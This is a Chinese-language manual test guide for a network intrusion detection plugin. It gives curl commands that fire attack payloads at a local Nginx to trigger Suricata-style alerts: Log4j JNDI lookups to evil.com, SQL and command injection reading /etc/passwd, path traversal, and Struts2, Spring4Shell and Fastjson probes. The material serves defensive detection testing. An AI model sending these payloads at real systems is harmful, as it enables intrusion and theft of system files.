# NIDS 网络攻击检测 — 手动测试指南

## 概述

本文档描述如何手动验证 nids 插件的网络入侵检测功能（DataType 6007）。

**检测原理**：通过 gopacket 抓取网卡流量，TCP 流重组后解析 HTTP 请求，将请求的 URI、Header、Body 等字段与 Suricata 格式规则进行匹配。匹配成功时产生告警。

**匹配方式**：

| 匹配类型 | 说明 | 示例 |
|----------|------|------|
| `content` | 字符串包含匹配 | `${jndi:` |
| `content` + `nocase` | 大小写不敏感包含匹配 | `sqlmap` |
| `pcre` | 正则表达式匹配 | `/union\s+(all\s+)?select\s+/i` |

**匹配缓冲区（Sticky Buffer）**：

| 关键字 | 匹配位置 |
|--------|----------|
| `http.uri` | HTTP 请求 URI（已 URL 解码） |
| `http.header` | HTTP 请求头 |
| `http.request_body` | HTTP 请求体 |
| `http.method` | HTTP 请求方法 |
| 无 | 完整 payload（Method + URI + Headers + Body） |

**关键源文件**：

| 文件 | 说明 |
|------|------|
| `business_plugins/nids/config/nids.rules` | Suricata 检测规则（20 条） |
| `business_plugins/nids/config/nids.yaml` | 插件配置（网卡、BPF 过滤器、TCP 重组参数） |
| `business_plugins/nids/rule_parser.go` | Suricata 规则解析器 |
| `business_plugins/nids/detector.go` | 规则匹配引擎与告警上报 |
| `business_plugins/nids/capture.go` | gopacket 抓包 + TCP 流重组 |
| `business_plugins/nids/http_parser.go` | HTTP 请求解析 |
| `business_plugins/nids/main.go` | 入口与优雅退出 |

## 前置条件

1. **Nginx**：需要在 80 端口运行 HTTP 服务，作为流量接收方
2. **libpcap**：运行时依赖 `libpcap`
3. **root 权限**：抓包需要 root 权限

## 编译部署与启动

```bash
# 1. 编译并部署
cd /home/work/goProject/src/company/agent
make build
make deploy

# 2. 启动 Nginx（如未运行）
sudo systemctl start nginx
# 验证 Nginx 监听
curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1/

# 3. 确认配置文件（默认抓 lo 接口，监控 80/8080 端口）
cat /opt/cloudsec/plugins/nids/config/nids.yaml

# 4. 启动 Agent（Terminal A）
cd /opt/cloudsec
sudo ./bin/agent -standalone -plugins=nids -output=stderr -test
```

**启动成功标志**（在 nids 日志中确认）：

```
INFO  Starting NIDS plugin...
INFO  Config loaded       {"interface": "lo", ...}
INFO  Suricata rules loaded {"count": 20, ...}
INFO  Packet capture initialized {"interface": "lo", ...}
```

**日志文件位置**：`/opt/cloudsec/logs/plugins/nids/nids.log`

---

## 测试用例

在另一个终端（Terminal B）中执行以下 curl 命令。每条命令执行后，在 Terminal A 或日志文件中观察是否输出告警。

> **说明**：测试通过 `curl` 向本机 Nginx 发送包含攻击特征的 HTTP 请求。由于目标是 `127.0.0.1`，流量走 `lo` 接口，nids 插件配置为抓取 `lo` 接口流量。

---

### SID 1001: Log4j2 JNDI 注入 — Header（critical）

```bash
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
```

**预期告警**：

```
sid=1001  msg="ET EXPLOIT Apache Log4j2 RCE - JNDI Injection in Header"  severity=critical
```

---

### SID 1002: Log4j2 JNDI 注入 — URI（critical）

```bash
# -g 禁止 curl 的 globbing 解析（否则 {} 会被 curl 特殊处理）
curl -s -o /dev/null -g --path-as-is 'http://127.0.0.1/${jndi:ldap://evil.com/a}'
```

**预期告警**：

```
sid=1002  msg="ET EXPLOIT Apache Log4j2 RCE - JNDI Injection in URI"  severity=critical
```

> **注意**：必须加 `-g` 参数，否则 curl 会将 `{` `}` 当作 URL globbing 语法处理，导致实际发送的 URI 中 `${}` 被破坏。

---

### SID 2001: SQL 注入 — UNION SELECT（high）

```bash
curl -s -o /dev/null 'http://127.0.0.1/api?id=1%20UNION%20SELECT%201,2,3'
```

**预期告警**：

```
sid=2001  msg="SQL Injection - UNION SELECT in URI"  severity=high
```

> **说明**：`%20` 是空格的 URL 编码，nids 会在匹配前进行 URL 解码，因此 `UNION SELECT` 能被 PCRE 规则正确匹配。

---

### SID 3001: 命令注入 — URI（critical）

```bash
curl -s -o /dev/null 'http://127.0.0.1/api?cmd=%3bcat%20/etc/passwd'
```

**预期告警**：

```
sid=3001  msg="OS Command Injection - Common Commands in URI"  severity=critical
```

> **说明**：`%3b` 是分号的 URL 编码，解码后为 `;cat /etc/passwd`，匹配规则中的 `/[;|`]\s*(cat|...)\s/` 模式。

---

### SID 4001 + 4003: 路径遍历（high）

```bash
# --path-as-is 防止 curl 自动规范化路径（去掉 ../）
curl -s -o /dev/null --path-as-is 'http://127.0.0.1/../../../../etc/passwd'
```

**预期告警**（2 条规则同时命中）：

```
sid=4001  msg="Path Traversal - etc/passwd Access"  severity=high
sid=4003  msg="Path Traversal - Deep Traversal"     severity=high
```

> **注意**：必须加 `--path-as-is`，否则 curl 会自动将 `../../../../etc/passwd` 规范化为 `/etc/passwd`，导致 `../` 特征消失。

---

### SID 5001: Struts2 OGNL 注入（critical）

```bash
# %25 是 % 的 URL 编码，%7B 是 { 的 URL 编码
# 解码后 URI 中包含 %{1+1}
curl -s -o /dev/null --path-as-is 'http://127.0.0.1/test%25%7B1+1%7D'
```

**预期告警**：

```
sid=5001  msg="Apache Struts2 RCE - OGNL Injection"  severity=critical
```

---

### SID 5002: Spring4Shell — Body（critical）

```bash
curl -s -o /dev/null -X POST -d 'class.module.classLoader.resources=test' http://127.0.0.1/
```

**预期告警**：

```
sid=5002  msg="Spring4Shell RCE - Class Loader Manipulation"  severity=critical
```

---

### SID 5003: Fastjson RCE — Body（critical）

```bash
curl -s -o /dev/null -X POST \
  -H 'Content-Type: application/json' \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl"}' \
  http://127.0.0.1/
```

**预期告警**：

```
sid=5003  msg="Fastjson RCE - AutoType Deserialization"  severity=critical
```

---

### SID 6001: 扫描器检测 — SQLMap UA（medium）

```bash
curl -s -o /dev/null -A 'sqlmap/1.0' http://127.0.0.1/
```

**预期告警**：

```
sid=6001  msg="Scanner Detection - SQLMap User-Agent"  severity=medium
```

---

### SID 6002: 扫描器检测 — Nmap UA（medium）

```bash
curl -s -o /dev/null -A 'nmap scripting engine' http://127.0.0.1/
```

**预期告警**：

```
sid=6002  msg="Scanner Detection - Nmap/Dirbuster/Nikto User-Agent"  severity=medium
```

---

### 重复攻击计数验证

```bash
# 连续发送 3 次相同攻击
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
```

**预期**：日志中 sid=1001 的 count 字段依次为 1、2、3（同一 src_ip + sid 的攻击计数递增）。

---

## 验证告警字段

在日志或 Agent stderr 输出中，确认每条告警包含以下关键字段：

| 字段 | 说明 | 示例值 |
|------|------|--------|
| `sid` | 规则 ID | 1001 |
| `vulnerability_name` | 漏洞名称（来自规则 msg） | ET EXPLOIT Apache Log4j2 RCE |
| `severity` | 严重程度 | critical / high / medium / low |
| `src_ip` | 攻击来源 IP | 127.0.0.1 |
| `dst_ip` | 被攻击 IP | 127.0.0.1 |
| `dst_port` | 目标端口 | 80 |
| `src_port` | 来源端口 | 55002 |
| `http_method` | HTTP 方法 | GET / POST |
| `http_uri` | 请求 URI | /${jndi:ldap://evil.com/a} |
| `attack_status` | 攻击分类（classtype） | attempted-admin |
| `reference` | 参考信息 | cve,2021-44228 |
| `attack_count` | 累计攻击次数 | 1 |
| `first_attack_time` | 首次攻击时间 | 2026-02-14T14:07:49+08:00 |
| `last_attack_time` | 最近攻击时间 | 2026-02-14T14:08:09+08:00 |
| `matched_payload` | 匹配的 payload 片段 | ${jndi:ldap://evil.com/a} |

---

## 测试结果记录表

| # | SID | 攻击类型 | 严重程度 | 测试命令 | 预期 | 实际 | 备注 |
|---|-----|----------|----------|----------|------|------|------|
| 1 | 1001 | Log4j2 JNDI Header | critical | `curl -H 'X-Api-Version: ${jndi:...}'` | 告警 | | |
| 2 | 1002 | Log4j2 JNDI URI | critical | `curl -g --path-as-is '.../${jndi:...}'` | 告警 | | |
| 3 | 2001 | SQL 注入 UNION SELECT | high | `curl '...?id=1%20UNION%20SELECT...'` | 告警 | | |
| 4 | 3001 | 命令注入 | critical | `curl '...?cmd=%3bcat%20/etc/passwd'` | 告警 | | |
| 5 | 4001 | 路径遍历 etc/passwd | high | `curl --path-as-is '.../../../etc/passwd'` | 告警 | | |
| 6 | 4003 | 路径遍历（深层） | high | （同上，同时触发） | 告警 | | |
| 7 | 5001 | Struts2 OGNL | critical | `curl --path-as-is '...%25%7B1+1%7D'` | 告警 | | |
| 8 | 5002 | Spring4Shell Body | critical | `curl -X POST -d 'class.module...'` | 告警 | | |
| 9 | 5003 | Fastjson RCE Body | critical | `curl -X POST -d '{"@type":"com.sun..."}'` | 告警 | | |
| 10 | 6001 | SQLMap 扫描器 UA | medium | `curl -A 'sqlmap/1.0'` | 告警 | | |
| 11 | 6002 | Nmap 扫描器 UA | medium | `curl -A 'nmap scripting engine'` | 告警 | | |
| 12 | — | 重复攻击计数 | — | 同一攻击连续 3 次 | count 递增 | | |

---

## 常见问题排查

| 问题 | 排查方法 |
|------|----------|
| Agent 启动后 nids 插件未加载 | 检查 `/opt/cloudsec/plugins/nids/nids` 是否存在且有执行权限；确认 `-plugins=nids` 参数 |
| 插件启动报 `failed to create packet capture` | 确认 root 权限；检查 `nids.yaml` 中的 interface 是否存在（`ip link show`）；确认 libpcap 已安装 |
| 规则加载 0 条 | 检查 `nids.rules` 文件路径和格式；查看日志中 `Suricata rules loaded` 行 |
| curl 发送请求但无告警 | 确认 Nginx 在 80 端口运行；确认 nids.yaml 的 interface 为 `lo`（localhost 流量走 lo）；用 `tcpdump -i lo port 80` 验证抓包 |
| 路径遍历未触发 | 确认 curl 加了 `--path-as-is`，否则 curl 会自动规范化路径去掉 `../` |
| Log4j2 URI 未触发 | 确认 curl 加了 `-g`，否则 `{}` 会被 curl 当作 globbing 语法处理 |
| SQL 注入/命令注入未触发 | PCRE 规则匹配的是 URL 解码后的内容，确认 nids 的 URL 解码功能正常工作 |
| 跨机器测试无告警 | 将 nids.yaml 的 interface 改为实际网卡（如 `ens33`），重启插件 |

---

## 规则配置说明

规则文件路径：`config/nids.rules`（相对于 nids 二进制所在目录）

### 规则格式

采用 Suricata 原生 `.rules` 文本格式：

```
alert http any any -> any any (msg:"规则描述"; content:"匹配字符串"; nocase; http.uri; sid:1001; rev:1; severity:1; classtype:attempted-admin; reference:cve,2021-44228;)
```

### 支持的关键字

| 关键字 | 说明 |
|--------|------|
| `content:"..."` | 字符串包含匹配，支持 `\|hex\|` 表示法 |
| `nocase` | 大小写不敏感（修饰前一个 content） |
| `pcre:"/pattern/flags"` | 正则匹配，支持 `i` `s` `m` 标志 |
| `http.uri` | 匹配 HTTP URI |
| `http.header` | 匹配 HTTP Header |
| `http.request_body` | 匹配 HTTP Body |
| `http.method` | 匹配 HTTP Method |
| `msg` | 告警描述 |
| `sid` | 规则 ID（必填） |
| `rev` | 规则版本 |
| `severity` | 严重级别（1=critical, 2=high, 3=medium, 4=low） |
| `classtype` | 攻击分类 |
| `reference` | 参考信息（如 CVE 编号） |

### 添加自定义规则

在 `nids.rules` 文件末尾追加：

```
alert http any any -> any any (msg:"自定义规则描述"; content:"匹配内容"; nocase; http.uri; sid:9001; rev:1; severity:2; classtype:web-application-attack; reference:url,example.com;)
```

修改后重启 Agent 生效。

---

## 测试完成后

1. 在 Terminal A 按 `Ctrl+C` 停止 Agent
2. （可选）停止 Nginx：`sudo systemctl stop nginx`
3. 将测试结果填入上方记录表
